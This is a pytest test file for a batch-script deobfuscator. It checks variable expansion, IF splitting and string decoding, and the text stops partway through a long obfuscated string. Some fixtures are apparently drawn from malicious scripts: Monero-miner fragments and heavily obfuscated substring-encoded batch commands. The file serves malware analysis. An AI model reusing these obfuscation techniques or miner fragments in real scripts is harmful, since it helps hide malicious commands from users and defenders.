import pytest
import multiprocessing

from batch_deobfuscator.batch_interpreter import BatchDeobfuscator


class TestUnittests:
    @staticmethod
    def test_simple_set():
        deobfuscator = BatchDeobfuscator()
        deobfuscator.interpret_command("set WALLET=43DTEF92be6XcPj5Z7U")
        res = deobfuscator.normalize_command("echo %WALLET%")
        assert res == "echo 43DTEF92be6XcPj5Z7U"

    @staticmethod
    def test_variable_in_for():
        deobfuscator = BatchDeobfuscator()
        deobfuscator.interpret_command("set WALLET=43DTEF92be6XcPj5Z7U")
        cmd = 'for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a'
        res = deobfuscator.normalize_command(cmd)
        assert res == 'for /f "delims=." %%a in ("43DTEF92be6XcPj5Z7U") do set WALLET_BASE=%%a'

    @staticmethod
    def test_unset_variable():
        deobfuscator = BatchDeobfuscator()
        cmd = "echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%"
        res = deobfuscator.normalize_command(cmd)
        assert res == "echo ERROR: Wrong wallet address length (should be 106 or 95): "

    @staticmethod
    def test_caret_pipe():
        deobfuscator = BatchDeobfuscator()
        cmd1 = 'echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL\n'
        cmd2 = [x for x in deobfuscator.get_commands(cmd1)]
        assert cmd2 == ['echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL']
        cmd3 = deobfuscator.normalize_command(cmd2[0])
        assert cmd3 == 'echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL'
        cmd4 = [x for x in deobfuscator.get_commands(cmd3)]
        assert cmd4 == ['echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL']

    @staticmethod
    def test_simple_set_a():
        # Gets the correct # of cores on the current machine
        num_cores = multiprocessing.cpu_count()

        deobfuscator = BatchDeobfuscator()
        res = deobfuscator.normalize_command("echo %NUMBER_OF_PROCESSORS%")
        assert res == f"echo {num_cores}"

        cmd = 'set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"'
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)
        cmd3 = deobfuscator.normalize_command("echo %EXP_MONERO_HASHRATE%")
        assert cmd3 == f"echo ({num_cores} * 700 / 1000)"

    @staticmethod
    @pytest.mark.parametrize(
      "var, echo, result",
      [
        # Simple
        # No space
        ("set EXP=43", "echo *%EXP%*", "echo *43*"),
        ("set EXP=43", "echo *%EXP %*", "echo **"),
        ("set EXP=43", "echo *% EXP%*", "echo **"),
        ("set EXP=43", "echo *% EXP %*", "echo **"),
        # Space after var
        ("set EXP =43", "echo *%EXP%*", "echo **"),
        ("set EXP =43", "echo *%EXP %*", "echo *43*"),
        ("set EXP =43", "echo *% EXP%*", "echo **"),
        ("set EXP =43", "echo *% EXP %*", "echo **"),
        # Space after equal
        ("set EXP= 43", "echo *%EXP%*", "echo * 43*"),
        ("set EXP= 43", "echo *%EXP %*", "echo **"),
        ("set EXP= 43", "echo *% EXP%*", "echo **"),
        ("set EXP= 43", "echo *% EXP %*", "echo **"),
        # Space after value
        ("set EXP=43 ", "echo *%EXP%*", "echo *43 *"),
        ("set EXP=43 ", "echo *%EXP %*", "echo **"),
        ("set EXP=43 ", "echo *% EXP%*", "echo **"),
        ("set EXP=43 ", "echo *% EXP %*", "echo **"),
        # Space after var and after equal
        ("set EXP = 43", "echo *%EXP%*", "echo **"),
        ("set EXP = 43", "echo *%EXP %*", "echo * 43*"),
        ("set EXP = 43", "echo *% EXP%*", "echo **"),
        ("set EXP = 43", "echo *% EXP %*", "echo **"),
        # Double quote
        # Single quote for both var and value
        ("set \"'EXP=43'\"", "echo *%EXP%*", "echo **"),
        ("set \"'EXP=43'\"", "echo *%EXP %*", "echo **"),
        ("set \"'EXP=43'\"", "echo *% EXP%*", "echo **"),
        ("set \"'EXP=43'\"", "echo *% EXP %*", "echo **"),
        ("set \"'EXP=43'\"", "echo *%'EXP%*", "echo *43'*"),
        # Space after var
        ('set "EXP =43"', "echo *%EXP%*", "echo **"),
        ('set "EXP =43"', "echo *%EXP %*", "echo *43*"),
        ('set "EXP =43"', "echo *% EXP%*", "echo **"),
        ('set "EXP =43"', "echo *% EXP %*", "echo **"),
        # Space after equal
        ('set "EXP= 43"', "echo *%EXP%*", "echo * 43*"),
        ('set "EXP= 43"', "echo *%EXP %*", "echo **"),
        ('set "EXP= 43"', "echo *% EXP%*", "echo **"),
        ('set "EXP= 43"', "echo *% EXP %*", "echo **"),
        # Space after var and after equal
        ('set "EXP = 43"', "echo *%EXP%*", "echo **"),
        ('set "EXP = 43"', "echo *%EXP %*", "echo * 43*"),
        ('set "EXP = 43"', "echo *% EXP%*", "echo **"),
        ('set "EXP = 43"', "echo *% EXP %*", "echo **"),
        # Space before var, after var, after equal and after value
        ('set " EXP = 43 "', "echo *%EXP%*", "echo **"),
        ('set " EXP = 43 "', "echo *%EXP %*", "echo * 43 *"),
        ('set " EXP = 43 "', "echo *% EXP%*", "echo **"),
        ('set " EXP = 43 "', "echo *% EXP %*", "echo **"),
        # Single quote
        ("set \"EXP='43'\"", "echo *%EXP%*", "echo *'43'*"),
        ("set \"EXP=' 43'\"", "echo *%EXP%*", "echo *' 43'*"),
        ("set \"EXP =' 43'\"", "echo *%EXP %*", "echo *' 43'*"),
        ("set \"EXP = ' 43'\"", "echo *%EXP %*", "echo * ' 43'*"),
        ("set 'EXP=\"43\"'", "echo *%'EXP%*", 'echo *"43"\'*'),
        ("set \" EXP '=43 ' \" ", "echo *%EXP '%*", "echo *43 ' *"),
        # Double quote as value
        ('set EXP =43^"', "echo *%EXP %*", 'echo *43"*'),
        ('set EXP =43^"3', "echo *%EXP %*", 'echo *43"3*'),
        ('set "EXP=43^""', "echo *%EXP%*", 'echo *43"*'),
        # ('set "EXP=43^"', "echo *%EXP%*", "echo *43*"),
        ('set "EXP=43^"3"', "echo *%EXP%*", 'echo *43"3*'),
        # ('set EXP=43^^"^|', "echo *%EXP%*", 'echo *43"|*'),
        ('set EXP=43^"^|', "echo *%EXP%*", 'echo *43"|*'),
        # ('set ^"EXP=43"', "echo *%EXP%*", "echo *43*"),
        # ('set ^"EXP=43""', "echo *%EXP%*", 'echo *43"*'),
        # ('set "EXP=43""', "echo *%EXP%*", 'echo *43"*'),
        # # Pipe values
        # ('set EXP=43"|', "echo *%EXP%*", 'echo *43"|*'),
        # ('set EXP=43^"^|', "echo *%EXP%*", 'echo *43"|*'),
        # Invalid syntax...
        # ('set EXP=43^"|', "echo *%EXP%*", []),
        # ('set EXP=43"^|', "echo *%EXP%*", 'echo *43"^|*'),
        # ('set EXP=43"^^|', "echo *%EXP%*", 'echo *43"^^|*'),
        # Getting into really weird stuff
        ("set EXP=4=3", "echo *%EXP%*", "echo *4=3*"),
        ('set ""EXP=43"', 'echo *%"EXP%*', "echo *43*"),
        ('set ""EXP=4"3', 'echo *%"EXP%*', "echo *4*"),
        ('set """EXP=43"', "echo *%EXP%*", "echo **"),
        ('set """EXP=43"', 'echo *%""EXP%*', "echo *43*"),
        ('set "E^XP=43"', "echo *%EXP%*", "echo *43*"),
        ('set " ^"EXP=43"', 'echo *%^"EXP%*', "echo *43*"),
        ('set ^"EXP=43', "echo *%EXP%*", "echo *43*"),
        ('set E^"XP=43', 'echo *%E"XP%*', "echo *43*"),
        ('set E"XP=4"3', 'echo *%E"XP%*', 'echo *4"3*'),
        ('set E"XP=4^""3', 'echo *%E"XP%*', 'echo *4""3*'),
        ('set EXP^"=43', 'echo *%EXP"%*', "echo *43*"),
        ("set EXP=43^^", "echo *%EXP%*", "echo *43*"),
        ("set EXP=4^^3", "echo *%EXP%*", "echo *43*"),
        ("set EXP=43^^ ", "echo *%EXP%*", "echo *43 *"),
        ("set E^^XP=43", "echo *%E^XP%*", "echo *43*"),
        ('set ^"E^^XP=43"', "echo *%E^XP%*", "echo *43*"),
        ('set ^"E^^XP=43""', "echo *%E^XP%*", 'echo *43"*'),
        ('set ^"E^^XP=43^"', "echo *%E^XP%*", "echo *43*"),
        ('set ^"E^^XP=43', "echo *%E^XP%*", "echo *43*"),
        ('set "E^^XP=43"', "echo *%E^^XP%*", "echo *43*"),
        ('set "E^^XP=43', "echo *%E^^XP%*", "echo *43*"),
        ('set E^"XP=4^"3', 'echo *%E"XP%*', 'echo *4"3*'),
        ('set ^"EXP=4^"3', "echo *%EXP%*", "echo *4*"),
        ('set ^"EXP= 4^"3', "echo *%EXP%*", "echo * 4*"),
        ('set ^"E^"XP=43"', 'echo *%E"XP%*', "echo *43*"),
        ('set ^"E^"XP=4^"3', 'echo *%E"XP%*', "echo *4*"),
        ('set ^"E"XP=4^"3"', 'echo *%E"XP%*', 'echo *4"3*'),
        ('set ^"E"XP=4^"3""', 'echo *%E"XP%*', 'echo *4"3"*'),
        ('set "E"XP=4^"3""', 'echo *%E"XP%*', 'echo *4"3"*'),
        ('set ^"E""XP=4^"3', 'echo *%E""XP%*', "echo *4*"),
        ('set "E^"XP=43"', 'echo *%E^"XP%*', "echo *43*"),
        ('set "E^"X"P=43"', 'echo *%E^"X"P%*', "echo *43*"),
        ('set E"E^"XP=43"', 'echo *%E"E^"XP%*', 'echo *43"*'),
        ('set E"E^"XP=43', 'echo *%E"E^"XP%*', "echo *43*"),
        ('set E^"E"X"P=43"', 'echo *%E"E"X"P%*', 'echo *43"*'),
        ('set E"E^"X"P=43"', 'echo *%E"E^"X"P%*', 'echo *43"*'),
        ("set ^|EXP=43", "echo *%|EXP%*", "echo *43*"),
        ("set EXP=43", "echo *%EXP:/=\\%*", "echo *43*"),
        ("set EXP=43/43", "echo *%EXP:/=\\%*", "echo *43\\43*"),
        ("set EXP=43", "echo *%EXP:\\=/%*", "echo *43*"),
        ("set EXP=43\\43", "echo *%EXP:\\=/%*", "echo *43/43*"),
        # TODO: Really, how should we handle that?
        # 'set ""EXP=43'
        # 'set'
        # 'set E'
        # 'set EXP'
        # 'set ^"E^"XP=43'
        # 'set ^"E""XP=43'
        #
        # option a
        ('set /a "EXP = 4 * 700 / 1000"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ('set /A "EXP = 4 * 700 / 1000"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ('SET /A "EXP = 4 * 700 / 1000"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ('SET /a "EXP = 4 * 700 / 1000"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ("set /a EXP = 4 * 700 / 1000", "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ('set /a ^"EXP = 4 * 700 / 1000"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ('set /a ^"E^"XP = 4 * 700 / 1000^"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ('set /a "EXP^" = 4 * 700 / 1000"', "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ("set /a EX^^P = 4 * 700 / 1000", "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ("set /a EX^P = 4 * 700 / 1000", "echo *%EXP%*", "echo *(4 * 700 / 1000)*"),
        ("set /a EXP = 4 * OTHER", "echo *%EXP%*", "echo *(4 * OTHER)*"),
        ("set/a EXP = 4 * 2", "echo *%EXP%*", "echo *(4 * 2)*"),
        ("set/AEXP=43", "echo *%EXP%*", "echo *(43)*"),
        ("set/AEXP=4 * 3", "echo *%EXP%*", "echo *(4 * 3)*"),
        # TODO: Really, how should we handle that?
        # 'set /a "EX|P = 4 * 700 / 1000'
        # "set /a EX|P = 4 * 700 / 1000"
        # "set /a EX^|P = 4 * 700 / 1000"
        #
        # option p
        ('set /p "EXP"="What is"', 'echo *%EXP"%*', "echo *__input__*"),
        ('set /p EXP="What is', "echo *%EXP%*", "echo *__input__*"),
        ("set /p EXP=What is", "echo *%EXP%*", "echo *__input__*"),
        ("SET /p EXP=What is", "echo *%EXP%*", "echo *__input__*"),
        ("SET /P EXP=What is", "echo *%EXP%*", "echo *__input__*"),
        ("set /P EXP=What is", "echo *%EXP%*", "echo *__input__*"),
        ('set /p EXP "=What is', 'echo *%EXP "%*', "echo *__input__*"),
        ('set /p  EXP "=What is', 'echo *%EXP "%*', "echo *__input__*"),
        ('set /p "EXP =What is', "echo *%EXP %*", "echo *__input__*"),
        ('set /p "EXP ="What is"', "echo *%EXP %*", "echo *__input__*"),
        ('set /p E"XP =What is', 'echo *%E"XP %*', "echo *__input__*"),
        ('set /p E^"XP ="What is"', 'echo *%E"XP %*', "echo *__input__*"),
        ('set /p "E^"XP ="What is"', 'echo *%E^"XP %*', "echo *__input__*"),
        ('set /p E^"XP =What is', 'echo *%E"XP %*', "echo *__input__*"),
        ('set /p "E^|XP =What is', "echo *%E^|XP %*", "echo *__input__*"),
        ("set /p E^|XP =What is", "echo *%E|XP %*", "echo *__input__*"),
        ('set /p ^"EXP =What is', "echo *%EXP %*", "echo *__input__*"),
        ("set /p ^|EXP =What is", "echo *%|EXP %*", "echo *__input__*"),
        # TODO: Really, how should we handle that?
        # 'set /p "EXP "=What is'
        # 'set /p "E^"XP =What is'
        # What about some weird echo statement now?
        ("set EXP=43", "echo %EXP%", "echo 43"),
        ("set EXP=43", "echo !EXP!", "echo 43"),
        ("set EXP=43", "echo ^%EXP%", "echo 43"),
        ("set EXP=43", "echo ^!EXP!", "echo 43"),
        # ("set EXP=43", "echo ^%EX^P%", "echo 43"),  # That's wrong... it actually prints the next line. Ignoring.
        ("set EXP=43", "echo ^!EX^P!", "echo 43"),
        # ("set EXP=43", "echo ^%EXP^%", "echo 43"),  # That's wrong... it actually prints the next line. Ignoring.
        ("set EXP=43", "echo ^!EXP^!", "echo 43"),
        # Dynamic variable %=exitcodeAscii%, which can't be interpreted ahead of script execution
        ("set code=%=exitcodeAscii%", "echo %code%", "echo %=exitcodeAscii%"),
        ("set code=%=exitcodeAscii%", "echo !code!", "echo %=exitcodeAscii%"),
        ("set code=%=exitcodeAscii%", "echo ^%code%", "echo %=exitcodeAscii%"),
        ("set code=%=exitcodeAscii%", "echo ^!code!", "echo %=exitcodeAscii%"),
      ],
    )
    def test_set_command(var, echo, result):
        deobfuscator = BatchDeobfuscator()
        deobfuscator.interpret_command(var)
        res = deobfuscator.normalize_command(echo)
        assert res == result

    @staticmethod
    def test_clear_variable_with_set():
        # If you specify only a variable and an equal sign (without <string>) for the set command,
        # the <string> value associated with the variable is cleared (as if the variable is not there).
        deobfuscator = BatchDeobfuscator()
        assert "exp" not in deobfuscator.variables
        res = deobfuscator.normalize_command("echo *%EXP%*")
        assert res == "echo **"
        deobfuscator.interpret_command("set EXP=43")
        assert "exp" in deobfuscator.variables
        res = deobfuscator.normalize_command("echo *%EXP%*")
        assert res == "echo *43*"
        deobfuscator.interpret_command("set EXP= ")
        assert "exp" in deobfuscator.variables
        res = deobfuscator.normalize_command("echo *%EXP%*")
        assert res == "echo * *"
        deobfuscator.interpret_command("set EXP=")
        assert "exp" not in deobfuscator.variables
        res = deobfuscator.normalize_command("echo *%EXP%*")
        assert res == "echo **"

    @staticmethod
    @pytest.mark.skip()
    def test_beautify_strlen_function():
        # Figure out if it translate somewhat correctly, and how to make it more readable after processing
        # Taken from 6c46550db4dcb3f5171c69c5f1723362f99ec0f16f6d7ab61b6f8d169a6e6bc8
        """
        ":strlen string len"
        "setlocal EnableDelayedExpansion"
        'set "token=#%~1" & set "len=0"'
        "for /L %%A in (12,-1,0) do ("
        '  set/A "len|=1<<%%A"'
        '  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"'
        ")"
        """

    @staticmethod
    @pytest.mark.parametrize(
      "statement, commands",
      [
        ('IF "A"=="A" echo AAA', ['IF "A"=="A" (', "echo AAA", ")"]),
        ('IF "A"=="A" (echo AAA)', ['IF "A"=="A" (', "echo AAA", ")"]),
        # TODO: Improvements to the whole program so that it doesn't need to split into multiple lines
        # It's going to break examples like
        # 'IF "A"=="B" (echo AAA) ELSE echo abc)'
        # Since wrapping "echo abc)" inside () will remove the print of the ) at the end of abc
        ('IF "A"=="A" (echo AAA) ELSE echo BBB', ['IF "A"=="A" (', "echo AAA", ") ELSE (", "echo BBB", ")"]),
        (
          'echo ABC && IF "A"=="A" (echo AAA) ELSE echo BBB',
          ["echo ABC", 'IF "A"=="A" (', "echo AAA", ") ELSE (", "echo BBB", ")"],
        ),
        (
          'echo ABC && IF "A"=="A" (echo AAA) ELSE (echo BBB)',
          ["echo ABC", 'IF "A"=="A" (', "echo AAA", ") ELSE (", "echo BBB", ")"],
        ),
        (
          'IF EXIST "%USERPROFILE%\\jin" GOTO REMOVE_DIR1',
          ['IF EXIST "%USERPROFILE%\\jin" (', "GOTO REMOVE_DIR1", ")"],
        ),
        (
          "IF defined EXP (echo Defined) ELSE (echo Undef)",
          ["IF defined EXP (", "echo Defined", ") ELSE (", "echo Undef", ")"],
        ),
        (
          "if %EXP% gtr 8192 ( set PORT=18192 & goto PORT_OK )",
          ["if %EXP% gtr 8192 (", " set PORT=18192", "goto PORT_OK )"],
        ),
        ("if %EXP% gtr 8192 (", ["if %EXP% gtr 8192 ("]),
        (
          "if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)",
          ["if %errorLevel% == 0 (", "set ADMIN=1", ") else (", "set ADMIN=0", ")"],
        ),
        (
          'if exist "%USERPROFILE%\\Start Menu\\Programs" (echo AAA)',
          ['if exist "%USERPROFILE%\\Start Menu\\Programs" (', "echo AAA", ")"],
        ),
        (
          'if exist "%USERPROFILE%\\Start Menu\\Programs" echo AAA',
          ['if exist "%USERPROFILE%\\Start Menu\\Programs" (', "echo AAA", ")"],
        ),
        (
          "if [%var%]==[value] echo AAA",
          ["if [%var%]==[value] (", "echo AAA", ")"],
        ),
        (
          'if "%var%"==[value] echo AAA',
          ['if "%var%"==[value] (', "echo AAA", ")"],
        ),
      ],
    )
    def test_if_statements(statement, commands):
        deobfuscator = BatchDeobfuscator()
        assert [x for x in deobfuscator.get_commands(statement)] == commands

    @staticmethod
    @pytest.mark.parametrize(
      "statement, commands",
      [
        # This is getting complicated
        # Based on 2369ddd7c46c244ec0984bc196bea498ce49999202de2c29f91f129383bf8cd5
        (
          "if %PROCESSOR_ARCHITECTURE%==x86 (python -c \"print('x86')\") else (python -c \"print('not x86')\")",
          [
            "if %PROCESSOR_ARCHITECTURE%==x86 (",
            "python -c \"print('x86')\"",
            ") else (",
            "python -c \"print('not x86')\"",
            ")",
          ],
        ),
        (
          """if %PROCESSOR_ARCHITECTURE%==x86 (python -c "[print('True x86 %RANDOM%') if True else print('False x86 %RANDOM%')]") else (python -c "[print('True not x86 %RANDOM%') if True else print('False not x86 %RANDOM%')]")""",
          [
            "if %PROCESSOR_ARCHITECTURE%==x86 (",
            '''python -c "[print('True x86 %RANDOM%') if True else print('False x86 %RANDOM%')]"''',
            ") else (",
            '''python -c "[print('True not x86 %RANDOM%') if True else print('False not x86 %RANDOM%')]"''',
            ")",
          ],
        ),
      ],
    )
    def test_complicated_if_statements(statement, commands):
        deobfuscator = BatchDeobfuscator()
        assert [x for x in deobfuscator.get_commands(statement)] == commands

    @staticmethod
    @pytest.mark.parametrize(
      "statement, commands",
      [
        (
          "if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no",
          ["if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no"],
        ),
        (
          "if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no(",
          ["if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no("],
        ),
        (
          # TODO: This is not right, but will do for the moment.
          "if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no)",
          ["if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no)"],
        ),
        (
          "if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no()",
          ["if %PROCESSOR_ARCHITECTURE%==AMD64 echo oh no()"],
        ),
        (
          "if %PROCESSOR_ARCHITECTURE%==AMD64 (echo oh no() else echo not again)",
          ["if %PROCESSOR_ARCHITECTURE%==AMD64 (", "echo oh no(", ") else echo not again)"],
        ),
        # If the writer assumes the statement to always be true, the else statement can be invalid...
        (
          "if %PROCESSOR_ARCHITECTURE%==AMD64 (echo if () else is so broken)",
          ["if %PROCESSOR_ARCHITECTURE%==AMD64 (", "echo if (", ") else is so broken)"],
        ),
      ],
    )
    @pytest.mark.skip()
    def test_broken_if_statements(statement, commands):
        deobfuscator = BatchDeobfuscator()
        assert [x for x in deobfuscator.get_commands(statement)] == commands

    @staticmethod
    def test_single_quote_var_name_rewrite_1():
        deobfuscator = BatchDeobfuscator()

        cmd = "%os:~-4,1%%comspec:~-1,1%%comspec:~14,1%%commonprogramfiles:~-6,1%'=^^^1^^^\\^^^)%comspec:~-13,1%u^^^,^^^%pathext:~31,1%b^^^8%commonprogramfiles:~9,1%^^^^^^^/v^^^&^^^U%os:~-9,1%^^^%pathext:~6,1%k%programfiles:~-12,1%p^^^[^^^*^^^@^^^~%programfiles:~-8,1%^^^%pathext:~11,1%q%comspec:~-14,1%^^^%commonprogramfiles:~24,1%^^^R^^^%pathext:~12,1%^^^0f^^^I^^^%comspec:~-9,1%^^^{^^^$%comspec:~-7,1%^^^K%programfiles:~-2,1%^^^7^^^9z%commonprogramfiles:~-11,1%^^^G^^^%os:~9,1%^^^L^^^=^^^(%commonprogramfiles:~-16,1%^^^%commonprogramfiles:~-12,1%h%comspec:~-15,1%^^^6^^^%commonprogramfiles:~10,1%^^^\"^^^Q^^^_^^^%pathext:~2,1%j^^^`%commonprogramfiles:~6,1%^^^Y^^^]^^^+^^^%pathext:~18,1%^^^-^^^%pathext:~26,1%^^^|^^^%comspec:~17,1%^^^%pathext:~7,1%^^^<%commonprogramfiles:~22,1%^^^%pathext:~17,1%^^^;^^^%os:~-10,1%^^^%os:~8,1%^^^%pathext:~41,1%^^^>^^^}^^^#^^^'%os:~-7,1%^^^.^^^5%os:~5,1%^^^4^^^:^^^%programfiles:~3,1%^^^%pathext:~47,1%%comspec:~25,1%^^^?^^^Z"  # noqa: E501
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)
        assert deobfuscator.variables["'"].startswith("^1^\\^)tu^")

        cmd = "%':~43,1%%':~-96,1%%':~6,1%"
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "set"

        cmd = "echo AAA%':~-138,1%%':~43,1%%':~-96,1%%':~6,1%%':~89,1%%':~-20,1%%':~-82,1%abbbc%':~-138,1%set mj=kx"
        cmd2 = deobfuscator.normalize_command(cmd)
        for cmd in deobfuscator.get_commands(cmd2):
            cmd2 = deobfuscator.normalize_command(cmd)
            deobfuscator.interpret_command(cmd2)
        assert deobfuscator.variables["'"] == "abbbc"

    @staticmethod
    @pytest.mark.parametrize(
      "cmd, result",
      [
        ("echo %0", "echo script.bat"),
        ("echo %1", "echo "),
        ("echo %~0", "echo script.bat"),
        ("echo %~1", "echo "),
        ("echo %~s0", "echo C:\\Users\\al\\Downloads\\script.bat"),
        ("echo %~s1", "echo "),
        ("echo %~f0", "echo C:\\Users\\al\\Downloads\\script.bat"),
        ("echo %~f1", "echo "),
        ("echo %~d0", "echo C:"),
        ("echo %~d1", "echo "),
        ("echo %~p0", "echo \\Users\\al\\Downloads\\"),
        ("echo %~p1", "echo "),
        ("echo %~z0", "echo 700"),
        ("echo %~z1", "echo "),
        ("echo %~a0", "echo --a--------"),
        ("echo %~a1", "echo "),
        ("echo %~n0", "echo script"),
        ("echo %~n1", "echo "),
        ("echo %~x0", "echo .bat"),
        ("echo %~x1", "echo "),
        ("echo %~t0", "echo 12/30/2022 11:41 AM"),
        ("echo %~t1", "echo "),
        ("echo %~xsa0", "echo --a-------- .bat"),
        ("echo %~nxst0", "echo 12/30/2022 11:41 AM script.bat"),
        ("echo %~nst0", "echo 12/30/2022 11:41 AM script"),
        ("echo %~atz0", "echo --a-------- 12/30/2022 11:41 AM 700"),
        ("echo %~fdpnxsatz0", "echo --a-------- 12/30/2022 11:41 AM 700 C:\\Users\\al\\Downloads\\script.bat"),
        ("echo %3c%3%A", "echo cA"),
        ("echo %3c%3%A%", "echo c"),
        ("echo %*", "echo "),
        ("echo %*a", "echo a"),
      ],
    )
    def test_args(cmd, result):
        deobfuscator = BatchDeobfuscator()

        res = deobfuscator.normalize_command(cmd)
        assert res == result

    @staticmethod
    def test_args_with_var():
        deobfuscator = BatchDeobfuscator()

        cmd = "set A=123"
        deobfuscator.interpret_command(cmd)

        cmd = "echo %3c%3%A%"
        res = deobfuscator.normalize_command(cmd)
        assert res == "echo c123"

        cmd = "echo %0%A%"
        res = deobfuscator.normalize_command(cmd)
        assert res == "echo script.bat123"

    @staticmethod
    def test_single_quote_var_name_rewrite_2():
        # Taken from 8d20c8a8104f29e7ec2ff158103fa73d3e9d357b646e2ff0487b880ab6462643
        deobfuscator = BatchDeobfuscator()

        cmd = "%os:~-4,1%%comspec:~-1,1%%comspec:~14,1%%commonprogramfiles:~-6,1%'=^^^1^^^\\^^^)%comspec:~-13,1%u^^^,^^^%pathext:~31,1%b^^^8%commonprogramfiles:~9,1%^^^^^^^/v^^^&^^^U%os:~-9,1%^^^%pathext:~6,1%k%programfiles:~-12,1%p^^^[^^^*^^^@^^^~%programfiles:~-8,1%^^^%pathext:~11,1%q%comspec:~-14,1%^^^%commonprogramfiles:~24,1%^^^R^^^%pathext:~12,1%^^^0f^^^I^^^%comspec:~-9,1%^^^{^^^$%comspec:~-7,1%^^^K%programfiles:~-2,1%^^^7^^^9z%commonprogramfiles:~-11,1%^^^G^^^%os:~9,1%^^^L^^^=^^^(%commonprogramfiles:~-16,1%^^^%commonprogramfiles:~-12,1%h%comspec:~-15,1%^^^6^^^%commonprogramfiles:~10,1%^^^\"^^^Q^^^_^^^%pathext:~2,1%j^^^`%commonprogramfiles:~6,1%^^^Y^^^]^^^+^^^%pathext:~18,1%^^^-^^^%pathext:~26,1%^^^|^^^%comspec:~17,1%^^^%pathext:~7,1%^^^<%commonprogramfiles:~22,1%^^^%pathext:~17,1%^^^;^^^%os:~-10,1%^^^%os:~8,1%^^^%pathext:~41,1%^^^>^^^}^^^#^^^'%os:~-7,1%^^^.^^^5%os:~5,1%^^^4^^^:^^^%programfiles:~3,1%^^^%pathext:~47,1%%comspec:~25,1%^^^?^^^Z"  # noqa: E501
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        cmd = "%':~-124,1%%':~43,1%%':~-96,1%%':~6,1%%':~89,1%%':~-20,1%%':~-82,1%%':~17,1%%':~-69,1%%':~134,1%%':~122,1%%':~7,1%%':~-79,1%%':~-138,1%%':~36,1%%':~-117,1%%':~-96,1%%':~-154,1%%':~-71,1%%':~-67,1%%':~54,1%%':~-67,1%%':~-121,1%%':~154,1%%':~78,1%%':~130,1%%':~-132,1%%':~-138,1%%':~-124,1%%':~-117,1%%':~64,1%%':~6,1%%':~89,1%%':~12,1%%':~47,1%%':~42,1%%':~-96,1%%':~28,1%%':~78,1%%':~15,1%%':~24,1%%':~-132,1%%':~39,1%%':~47,1%%':~22,1%%':~-124,1%%':~25,1%%':~52,1%%':~-71,1%!'!%':~89,1%%':~122,1%%':~64,1%%':~-118,1%%':~89,1%%':~-143,1%%':~-69,1%%':~89,1%%':~80,1%%':~-124,1%%':~-96,1%%':~-99,1%%':~84,1%%':~70,1%%':~143,1%%':~-26,1%%0 %':~-138,1%%':~36,1%%':~43,1%%':~-96,1%%':~-154,1%%':~-71,1%%':~103,1%%':~20,1%%':~-130,1%%':~-36,1%%':~78,1%%':~45,1%%':~-149,1%%':~-106,1%%':~22,1%%':~36,1%%':~-117,1%%':~84,1%%':~-153,1%%':~6,1%%':~141,1%%':~-90,1%%':~-14,1%%':~122,1%%':~-71,1%%':~19,1%%':~43,1%%':~89,1%%':~-141,1%%':~-108,1%%':~-71,1%%':~19,1%%':~-154,1%%':~89,1%%':~51,1%%':~22,1%%':~36,1%%':~-96,1%%':~-5,1%%':~-135,1%%':~6,1%%':~5,1%%':~-71,1%%':~-96,1%%':~81,1%%':~-117,1%%':~64,1%%':~-71,1%%':~80,1%%':~36,1%%':~-99,1%%':~-79,1%%':~-117,1%%':~-155,1%%':~22,1%%':~36,1%%':~-96,1%%':~-38,1%%':~-19,1%%':~-79,1%%':~70,1%%':~-99,1%%':~39,1%%':~81,1%%':~-138,1%%':~36,1%%':~-117,1%%':~64,1%%':~-154,1%%':~89,1%%':~-113,1%%':~42,1%%':~98,1%%':~-82,1%%':~12,1%%':~24,1%%':~15,1%%':~-149,1%%':~22,1%%':~36,1%%':~43,1%%':~-96,1%%':~-154,1%%':~89,1%%':~-20,1%%':~-82,1%%':~-79,1%%':~17,1%%':~17,1%%':~17,1%%':~-28,1%%':~61,1%%':~-143,1%%':~17,1%%':~17,1%%':~-94,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~-63,1%%':~17,1%%':~-143,1%%':~17,1%%':~87,1%%':~-14,1%%':~17,1%%':~17,1%%':~17,1%%':~124,1%%':~141,1%%':~-143,1%%':~17,1%%':~-143,1%%':~138,1%%':~17,1%%':~17,1%%':~17,1%%':~36,1%%':~-143,1%%':~17,1%%':~17,1%%':~-100,1%%':~-143,1%%':~17,1%%':~17,1%%':~-136,1%%':~17,1%%':~17,1%%':~17,1%%':~-34,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~95,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~-88,1%%':~-143,1%%':~-143,1%%':~17,1%%':~148,1%%':~17,1%%':~17,1%%':~17,1%%':~113,1%%':~17,1%%':~17,1%%':~-143,1%%':~111,1%%':~17,1%%':~17,1%%':~-143,1%%':~-60,1%%':~12,1%%':~17,1%%':~-143,1%%':~-143,1%%